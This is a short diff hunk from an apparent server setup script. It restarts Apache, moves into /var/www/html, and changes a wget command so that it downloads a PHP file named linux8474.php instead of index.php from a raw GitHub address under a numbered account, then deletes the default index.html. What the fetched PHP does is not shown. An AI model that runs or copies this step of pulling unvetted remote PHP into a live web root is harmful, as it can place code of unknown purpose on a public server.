@@ -27,7 +27,7 @@ service apache2 restart
 
 cd /var/www/html/
 
-wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/index.php
+wget -q -N https://raw.githubusercontent.com/mobileapps84741274/mobile84741274/master/linux8474.php
 
 rm -rf /var/www/html/index.html
 
